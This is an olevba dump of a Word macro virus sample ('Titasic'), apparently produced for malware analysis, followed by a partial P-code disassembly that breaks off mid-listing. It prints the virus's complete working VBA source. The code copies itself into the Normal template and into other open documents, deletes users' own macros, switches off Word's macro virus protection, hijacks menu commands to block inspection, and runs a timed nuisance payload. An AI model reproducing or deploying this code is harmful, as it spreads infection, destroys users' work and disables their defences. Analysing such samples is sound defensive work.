olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Titasic.l
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Titasic.l - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO astia.bas 
in file: ./Virus.MSWord.Titasic.l - OLE stream: 'Macros/VBA/astia'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public AD As Object, aDes As Variant
Public NonTitasic As Boolean, afound As Boolean, hapus As Boolean, reset As Boolean, aExc As Boolean, DocCount As Boolean
Function AstMaster()
Dim nmak(1) As String
Dim NT As Object
Dim aSrc$
On Error GoTo selesai
nmak(0) = "astia"
nmak(1) = "TITASIC"

aSrc = MacroContainer
Set NT = NormalTemplate
If Not DocCount Then
Set AD = ActiveDocument
ElseIf aSrc <> "SNrml.dot" Then
aSrc = NT
End If

If aSrc = NT Then
aSrc = NT.FullName: Set aDes = AD
ElseIf aSrc = AD Then
aSrc = AD.FullName: Set aDes = NT
ElseIf aSrc = "SNrml.dot" Then
Set aDes = NT
aSrc = Options.DefaultFilePath(8) & "\SNrml.src"
End If

Mhapus aDes
With aDes.VBProject
If Not (Not hapus And .Description = "astia" And .VBComponents.Count > 2) Then
    Mcopy aSrc, aDes, nmak
    hapus = False
    .Description = "astia"
    If aDes = NT Then
        Options.SaveInterval = 1
        CustomizationContext = NT
        CommandBars("Tools").reset
        KeyBindings.Add KeyCode:=BuildKeyCode(77, 1024), KeyCategory:=1, _
        Command:="ToolsRecordMacroStart"
        aDes.Save
    End If
    CommandBars("Macro").Controls(2).OnAction = "ViewVbCode"
Else
GoTo Aksi
End If
End With
If afound = True Then Exit Function
Refresh
On Error Resume Next
Aksi:
If aExc = True Then Exit Function
Exit Function
selesai:
If Err.Number = 50289 Then MsgBox "Terimakasih Anda Telah" & (13) & "Memproteksi Word dengan Aman", vbInformation, "Titasic"
End Function

Sub Mhapus(Sfile)
Dim nmak As Object
For Each nmak In Sfile.VBProject.VBComponents
    If nmak.Name = "NewMacros" Then NonTitasic = True
    If nmak.Name <> "ThisDocument" And nmak.Name <> "NewMacros" _
    And nmak.Name <> "astia" And nmak.Name <> "TITASIC" Then
        hapus = True
        If reset Then
        Application.OrganizerDelete Sfile.FullName, nmak.Name, 3
        Else
        nmak.CodeModule.DeleteLines 1, nmak.CodeModule.CountOfLines
        End If
    End If
Next nmak
End Sub
Sub Mcopy(Sfile, Dfile, nmak)
Dim aNmak
For Each aNmak In nmak
Application.OrganizerCopy Sfile, Dfile.FullName, aNmak, 3
Next
End Sub
Sub Action()
Documents.Add
On Error Resume Next
With ActiveWindow
.Caption = "Titasic"
.ActivePane.View.Zoom.Percentage = 100
.View.FullScreen = Not .View.FullScreen
.DisplayRulers = False
.DisplayHorizontalScrollBar = False
.DisplayVerticalRuler = False
.DisplayVerticalScrollBar = False
.View.ShowTextBoundaries = False
    CommandBars("Full Screen").Position = 1
    With CommandBars("Full Screen").Controls(1)
    .Caption = "Titasic," & "  " & Date
    .Style = 3
    .FaceId = 281
    End With
.View.Type = 6
Randomize
With ActiveDocument.Background.Fill
    .Visible = True
    .PresetGradient Int((6 - 1 + 1) * Rnd + 1), 1, Int((24 - 1 + 1) * Rnd + 1)
End With
TITASIC.Show
.View.FullScreen = Not .View.FullScreen
End With
CommandBars("Full Screen").reset
WBT
ActiveDocument.Close 0
WBF
End Sub
Sub FileOpen()
WBT
If Dialogs(80).Show <> 0 Then
WBF
AutoOpen
Else
WBF
End If
End Sub

Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
AstMaster
If Documents.Count > 1 Then
    For i = 1 To Documents.Count
    If Documents(i).Name <> ActiveDocument.Name Then
    Set AD = Documents(i)
    DocCount = True
    hapus = False
    AstMaster
    End If
    Next
End If
If Now > DateSerial(1998, 9, 15) Then Application.OnTime When:=Now + TimeValue("00:45:00"), Name:="astia.Action"
End
End Sub
Sub ViewVbCode()
If MsgBox("Maaf.." & Chr(13) & "Anda jangan coba-coba mengedit, merubah, ataupun menghapus makro Titasic..!!" & Chr(13) & Chr(13) _
& "Anda hanya bisa merekam makro, menyimpan, menggunakan" & Chr(13) & "serta menghapus makro buatan Anda" & Chr(13) & Chr(13) & " Apakah Anda ingin merekam makro..?", vbExclamation + vbYesNo, "Titasic") _
= vbYes Then SendKeys "%m%s{down}~%d'Macro non-Titasic'%m"
End Sub
Sub AutoExec()
On Error Resume Next
If MacroContainer <> NormalTemplate Then
aExc = True
AstMaster
WBT
AddIns.Unload False
WBF
End If
Application.EnableCancelKey = wdCancelDisabled
End Sub
Sub AutoExit()
Dim aAddin As Object
On Error GoTo batal
WBT
If Documents.Count <> 0 Then Documents.Close
Options.DefaultFilePath(2) = Options.DefaultFilePath(6)
afound = True
For Each aAddin In AddIns
    If aAddin.Name = "SNrml.dot" Then afound = False
Next aAddin
        
If afound = True Then
Application.Visible = False
Documents.Add
AstMaster
    With ActiveDocument
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.src", FileFormat:=wdFormatDocument, AddToRecentFiles:=False
        .SaveAs FileName:=Options.DefaultFilePath(8) & "\SNrml.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False
    End With
End If
Application.Quit
batal:
WBF
End Sub
Sub ToolsMacro()
WBF
On Error GoTo batal
Mhapus ActiveDocument
If NonTitasic Then
    If MacroContainer = ActiveDocument Then Application.Run NormalTemplate.VBProject.Name & ".astia.ToolsMacro": Exit Sub
    Application.DisplayAlerts = 0
        With Dialogs(215)
        .Description = "Macros Titasic mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Titasic')"
        If .Display = 1 Then .Execute
        End With
    Application.DisplayAlerts = -1
Else
ViewVbCode
End If
batal:
End Sub
Sub FileTemplates()
WBF
If Not reset Then Dialogs(87).Display
End Sub
Sub FormatStyle()
WBF
Dialogs(180).Show
End Sub
Function Refresh()
reset = True
FileTemplates
Mhapus aDes
End Function
Sub AutoClose()
Application.DisplayAlerts = -1
With Options
.SaveNormalPrompt = False
.SaveInterval = 10
.VirusProtection = False
End With
If ActiveWindow.Caption <> "Titasic" And InStr(1, ActiveDocument.Name, "Docume", 1) = 0 _
And ActiveDocument.Name <> "SNrml.dot" Then AstMaster
End Sub
Sub FileExit()
AutoExit
End Sub
Sub ToolsOptions()
Options.DefaultFilePath(wdUserTemplatesPath) = "C:\Program Files\Microsoft Office\Templates"
Dialogs(wdDialogToolsOptions).Show
Options.DefaultFilePath(wdUserTemplatesPath) = Application.Path
End Sub
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function

-------------------------------------------------------------------------------
VBA MACRO TITASIC.frm 
in file: ./Virus.MSWord.Titasic.l - OLE stream: 'Macros/VBA/TITASIC'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 





























































































































Dim Teks(4) As String
Private Sub CommandButton1_Click()
Do
    With TITASIC
    .Height = .Height - 10
    .Width = .Width - 15
    If .Height < 25 Then Exit Do
    End With
    Beep
Loop
Unload Me
End Sub
Private Sub UserForm_Activate()
TT
End Sub
Sub TT()
Dim a As Byte, diam As Boolean
Dim tp&, tm!, sel!, i%
a = 1
diam = True
TITASIC.Enabled = False
Do
    DoEvents
    sel = Timer - tm
    tp = tp + 1
    If tp Mod 300 = 0 Then
    Label4.ForeColor = TITASIC.BackColor
    End If
    If tp Mod 600 = 0 Then
    Label4.ForeColor = &H80000009
End If
    If sel > 0.1 Then
        tm = Timer
        i = i + 1
        If a = 4 Then Label1.Font.Size = 16: Label1.Width = Image1.Width
        Label1.Caption = Label1.Caption & Mid(Teks(a), i, 1)
        If Mid(Teks(a), i, 1) Like "[! ]" Then Beep
            If Len(Label1.Caption) = Len(Teks(a)) Then
                If diam Then
                    Do
                    If Timer - tm > 1 Then Exit Do
                    DoEvents
                    Label4.ForeColor = TITASIC.BackColor
                    Loop
                    diam = False
                    If a = 4 Then GoTo catat
                End If
            Label2.Move Label2.Left - 9
            If Label2.Left <= Label1.Left Then GoSub catat
        End If
    End If
Loop
Exit Sub
catat:
If a <> 5 Then Label1.Caption = ""
tm = Timer
Label2.Left = Label1.Left + Label1.Width
a = a + 1
i = 0
diam = True
        If a = 5 Then
            Label4.Visible = False
            Frame1.Visible = True
            Image1.Visible = True
            TITASIC.Enabled = True
            CommandButton1.SetFocus
            Image1.Picture = LoadPicture(System.PrivateProfileString("", _
            "HKEY_CURRENT_USER\Control Panel\desktop", "Wallpaper"))
            Exit Sub
        End If
Return
End Sub
Private Sub UserForm_Layout()
Dim waktu%, shalat$
waktu = Val(Format(Time, "hh"))
Select Case waktu
Case 12 To 14
shalat = "DZUHUR"
Case 15 To 17
shalat = "ASHAR"
Case 18 To 18
shalat = "MAGHRIB"
Case 19 To 23
shalat = "ISYA"
Case 0 To 2
shalat = "ISYA"
Case 5 To 5
shalat = "SUBUH"
Case Else
Label4.Visible = False
End Select

Teks(1) = "Mungkin kehadiran TITASIC mengganggu kesibukan Anda, untuk itu maafkanlah kelancangan Titasic .."
Teks(2) = "Ingat...!! Radiasi komputer berbahaya bagi Anda! So.. istirahatlah sejenak biar enggak stres, pusing, uring-uringan, dsb..!"
Teks(3) = "Buat Cewek 'SINGLE' yang merasa dirinya Cakeup & Manis.., Salam dari Astia..!"
Teks(4) = "Mangga bilih bade didamel deui.!"
Label2.Left = Label1.Left + Label1.Width
Label3.Caption = "By : Astia '98" & Chr(13) & Chr(13) & "Thanks to : " & Chr(13) & Application.UserName
Label4.Caption = "Anda Sudah Shalat " & shalat & "!"
End Sub
Private Sub UserForm_Terminate()
    Dim i As Integer
    For i = 1 To 100
        Beep
    Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Titasic.l
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1120 bytes
' Macros/VBA/astia - 12506 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn aDes (As Variant)
' Line #1:
' 	Dim (Public) 
' 	VarDefn NonTitasic (As Boolean)
' 	VarDefn afound (As Boolean)
' 	VarDefn hapus (As Boolean)
' 	VarDefn reset (As Boolean)
' 	VarDefn aExc (As Boolean)
' 	VarDefn DocCount (As Boolean)
' Line #2:
' 	FuncDefn (Function AstMaster())
' Line #3:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0001 
' 	VarDefn nmak (As String)
' Line #4:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #5:
' 	Dim 
' 	VarDefn aSrc
' Line #6:
' 	OnError selesai 
' Line #7:
' 	LitStr 0x0005 "astia"
' 	LitDI2 0x0000 
' 	ArgsSt nmak 0x0001 
' Line #8:
' 	LitStr 0x0007 "TITASIC"
' 	LitDI2 0x0001 
' 	ArgsSt nmak 0x0001 
' Line #9:
' Line #10:
' 	Ld MacroContainer 
' 	St aSrc 
' Line #11:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set NT 
' Line #12:
' 	Ld DocCount 
' 	Not 
' 	IfBlock 
' Line #13:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set AD 
' Line #14:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	ElseIfBlock 
' Line #15:
' 	Ld NT 
' 	St aSrc 
' Line #16:
' 	EndIfBlock 
' Line #17:
' Line #18:
' 	Ld aSrc 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	Ld NT 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld AD 
' 	Set aDes 
' Line #20:
' 	Ld aSrc 
' 	Ld AD 
' 	Eq 
' 	ElseIfBlock 
' Line #21:
' 	Ld AD 
' 	MemLd FullName 
' 	St aSrc 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #22:
' 	Ld aSrc 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	ElseIfBlock 
' Line #23:
' 	SetStmt 
' 	Ld NT 
' 	Set aDes 
' Line #24:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	St aSrc 
' Line #25:
' 	EndIfBlock 
' Line #26:
' Line #27:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #28:
' 	StartWithExpr 
' 	Ld aDes 
' 	MemLd VBProject 
' 	With 
' Line #29:
' 	Ld hapus 
' 	Not 
' 	MemLdWith Description 
' 	LitStr 0x0005 "astia"
' 	Eq 
' 	And 
' 	MemLdWith VBComponents 
' 	MemLd Count 
' 	LitDI2 0x0002 
' 	Gt 
' 	And 
' 	Paren 
' 	Not 
' 	IfBlock 
' Line #30:
' 	Ld aSrc 
' 	Ld aDes 
' 	Ld nmak 
' 	ArgsCall Mcopy 0x0003 
' Line #31:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #32:
' 	LitStr 0x0005 "astia"
' 	MemStWith Description 
' Line #33:
' 	Ld aDes 
' 	Ld NT 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveInterval 
' Line #35:
' 	Ld NT 
' 	St CustomizationContext 
' Line #36:
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #37:
' 	LineCont 0x0004 10 00 08 00
' 	LitDI2 0x004D 
' 	LitDI2 0x0400 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ParamNamed KeyCode 
' 	LitDI2 0x0001 
' 	ParamNamed KeyCategory 
' 	LitStr 0x0015 "ToolsRecordMacroStart"
' 	ParamNamed Command 
' 	Ld KeyBindings 
' 	ArgsMemCall Add 0x0003 
' Line #38:
' 	Ld aDes 
' 	ArgsMemCall Save 0x0000 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	LitStr 0x000A "ViewVbCode"
' 	LitDI2 0x0002 
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #41:
' 	ElseBlock 
' Line #42:
' 	GoTo Aksi 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	EndWith 
' Line #45:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #46:
' 	ArgsCall Refresh 0x0000 
' Line #47:
' 	OnError (Resume Next) 
' Line #48:
' 	Label Aksi 
' Line #49:
' 	Ld aExc 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitFunc 
' 	EndIf 
' Line #50:
' 	ExitFunc 
' Line #51:
' 	Label selesai 
' Line #52:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI4 0xC471 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0016 "Terimakasih Anda Telah"
' 	LitDI2 0x000D 
' 	Paren 
' 	Concat 
' 	LitStr 0x001C "Memproteksi Word dengan Aman"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x0007 "Titasic"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #53:
' 	EndFunc 
' Line #54:
' Line #55:
' 	FuncDefn (Sub Mhapus(Sfile))
' Line #56:
' 	Dim 
' 	VarDefn nmak (As Object)
' Line #57:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	Ld Sfile 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ForEach 
' Line #58:
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NonTitasic 
' 	EndIf 
' Line #59:
' 	LineCont 0x0004 0C 00 04 00
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0009 "NewMacros"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0005 "astia"
' 	Ne 
' 	And 
' 	Ld nmak 
' 	MemLd New 
' 	LitStr 0x0007 "TITASIC"
' 	Ne 
' 	And 
' 	IfBlock 
' Line #60:
' 	LitVarSpecial (True)
' 	St hapus 
' Line #61:
' 	Ld reset 
' 	IfBlock 
' Line #62:
' 	Ld Sfile 
' 	MemLd FullName 
' 	Ld nmak 
' 	MemLd New 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerDelete 0x0003 
' Line #63:
' 	ElseBlock 
' Line #64:
' 	LitDI2 0x0001 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nmak 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Ld nmak 
' 	EndForVariable 
' 	NextVar 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Sub Mcopy(Sfile, Dfile, nmak))
' Line #70:
' 	Dim 
' 	VarDefn aNmak
' Line #71:
' 	StartForVariable 
' 	Ld aNmak 
' 	EndForVariable 
' 	Ld nmak 
' 	ForEach 
' Line #72:
' 	Ld Sfile 
' 	Ld Dfile 
' 	MemLd FullName 
' 	Ld aNmak 
' 	LitDI2 0x0003 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #73:
' 	StartForVariable 
' 	Next 
' Line #74:
' 	EndSub 
' Line #75:
' 	FuncDefn (Sub Action())
' Line #76:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #77:
' 	OnError (Resume Next) 
' Line #78:
' 	StartWithExpr 
' 	Ld ActiveWindow 
' 	With 
' Line #79:
' 	LitStr 0x0007 "Titasic"
' 	MemStWith Caption 
' Line #80:
' 	LitDI2 0x0064 
' 	MemLdWith ActivePane 
' 	MemLd View 
' 	MemLd Zoom 
' 	MemSt Percentage 
' Line #81:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #82:
' 	LitVarSpecial (False)
' 	MemStWith DisplayRulers 
' Line #83:
' 	LitVarSpecial (False)
' 	MemStWith DisplayHorizontalScrollBar 
' Line #84:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalRuler 
' Line #85:
' 	LitVarSpecial (False)
' 	MemStWith DisplayVerticalScrollBar 
' Line #86:
' 	LitVarSpecial (False)
' 	MemLdWith View 
' 	MemSt ShowTextBoundaries 
' Line #87:
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Position 
' Line #88:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	With 
' Line #89:
' 	LitStr 0x0008 "Titasic,"
' 	LitStr 0x0002 "  "
' 	Concat 
' 	Ld Date 
' 	Concat 
' 	MemStWith Caption 
' Line #90:
' 	LitDI2 0x0003 
' 	MemStWith Style 
' Line #91:
' 	LitDI2 0x0119 
' 	MemStWith FaceId 
' Line #92:
' 	EndWith 
' Line #93:
' 	LitDI2 0x0006 
' 	MemLdWith View 
' 	MemSt TypeOf 
' Line #94:
' 	ArgsCall Read 0x0000 
' Line #95:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd Background 
' 	MemLd Fill 
' 	With 
' Line #96:
' 	LitVarSpecial (True)
' 	MemStWith Visible 
' Line #97:
' 	LitDI2 0x0006 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	LitDI2 0x0001 
' 	LitDI2 0x0018 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsMemCallWith PresetGradient 0x0003 
' Line #98:
' 	EndWith 
' Line #99:
' 	Ld TITASIC 
' 	ArgsMemCall Show 0x0000 
' Line #100:
' 	MemLdWith View 
' 	MemLd FullScreen 
' 	Not 
' 	MemLdWith View 
' 	MemSt FullScreen 
' Line #101:
' 	EndWith 
' Line #102:
' 	LitStr 0x000B "Full Screen"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemCall reset 0x0000 
' Line #103:
' 	ArgsCall WBT 0x0000 
' Line #104:
' 	LitDI2 0x0000 
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0001 
' Line #105:
' 	ArgsCall WBF 0x0000 
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub FileOpen())
' Line #108:
' 	ArgsCall WBT 0x0000 
' Line #109:
' 	LitDI2 0x0050 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #110:
' 	ArgsCall WBF 0x0000 
' Line #111:
' 	ArgsCall AutoOpen 0x0000 
' Line #112:
' 	ElseBlock 
' Line #113:
' 	ArgsCall WBF 0x0000 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	EndSub 
' Line #116:
' Line #117:
' 	FuncDefn (Sub AutoOpen())
' Line #118:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #119:
' 	ArgsCall AstMaster 0x0000 
' Line #120:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0001 
' 	Gt 
' 	IfBlock 
' Line #121:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #122:
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	MemLd New 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #123:
' 	SetStmt 
' 	Ld i 
' 	ArgsLd Documents 0x0001 
' 	Set AD 
' Line #124:
' 	LitVarSpecial (True)
' 	St DocCount 
' Line #125:
' 	LitVarSpecial (False)
' 	St hapus 
' Line #126:
' 	ArgsCall AstMaster 0x0000 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	StartForVariable 
' 	Next 
' Line #129:
' 	EndIfBlock 
' Line #130:
' 	Ld Now 
' 	LitDI2 0x07CE 
' 	LitDI2 0x0009 
' 	LitDI2 0x000F 
' 	ArgsLd DateSerial 0x0003 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld Now 
' 	LitStr 0x0008 "00:45:00"
' 	ArgsLd TimeValue 0x0001 
' 	Add 
' 	ParamNamed When 
' 	LitStr 0x000C "astia.Action"
' 	ParamNamed New 
' 	Ld Application 
' 	ArgsMemCall OnTime 0x0002 
' 	EndIf 
' Line #131:
' 	End 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Sub ViewVbCode())
' Line #134:
' 	LineCont 0x0008 15 00 00 00 31 00 00 00
' 	LitStr 0x0006 "Maaf.."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x004C "Anda jangan coba-coba mengedit, merubah, ataupun menghapus makro Titasic..!!"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0035 "Anda hanya bisa merekam makro, menyimpan, menggunakan"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0021 "serta menghapus makro buatan Anda"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0023 " Apakah Anda ingin merekam makro..?"
' 	Concat 
' 	Ld vbExclamation 
' 	Ld vbYesNo 
' 	Add 
' 	LitStr 0x0007 "Titasic"
' 	ArgsLd MsgBox 0x0003 
' 	Ld vbYes 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0022 "%m%s{down}~%d'Macro non-Titasic'%m"
' 	ArgsCall SendKeys 0x0001 
' 	EndIf 
' Line #135:
' 	EndSub 
' Line #136:
' 	FuncDefn (Sub AutoExec())
' Line #137:
' 	OnError (Resume Next) 
' Line #138:
' 	Ld MacroContainer 
' 	Ld NormalTemplate 
' 	Ne 
' 	IfBlock 
' Line #139:
' 	LitVarSpecial (True)
' 	St aExc 
' Line #140:
' 	ArgsCall AstMaster 0x0000 
' Line #141:
' 	ArgsCall WBT 0x0000 
' Line #142:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #143:
' 	ArgsCall WBF 0x0000 
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub AutoExit())
' Line #148:
' 	Dim 
' 	VarDefn aAddin (As Object)
' Line #149:
' 	OnError batal 
' Line #150:
' 	ArgsCall WBT 0x0000 
' Line #151:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #152:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #153:
' 	LitVarSpecial (True)
' 	St afound 
' Line #154:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #155:
' 	Ld aAddin 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St afound 
' 	EndIf 
' Line #156:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	NextVar 
' Line #157:
' Line #158:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #159:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #160:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #161:
' 	ArgsCall AstMaster 0x0000 
' Line #162:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #163:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #164:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #165:
' 	EndWith 
' Line #166:
' 	EndIfBlock 
' Line #167:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #168:
' 	Label batal 
' Line #169:
' 	ArgsCall WBF 0x0000 
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Sub ToolsMacro())
' Line #172:
' 	ArgsCall WBF 0x0000 
' Line #173:
' 	OnError batal 
' Line #174:
' 	Ld ActiveDocument 
' 	ArgsCall Mhapus 0x0001 
' Line #175:
' 	Ld NonTitasic 
' 	IfBlock 
' Line #176:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0011 ".astia.ToolsMacro"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #177:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #178:
' 	StartWithExpr 
' 	LitDI2 0x00D7 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #179:
' 	LitStr 0x0076 "Macros Titasic mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Titasic')"
' 	MemStWith Description 
' Line #180:
' 	MemLdWith Display 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsMemCallWith Execute 0x0000 
' 	EndIf 
' Line #181:
' 	EndWith 
' Line #182:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
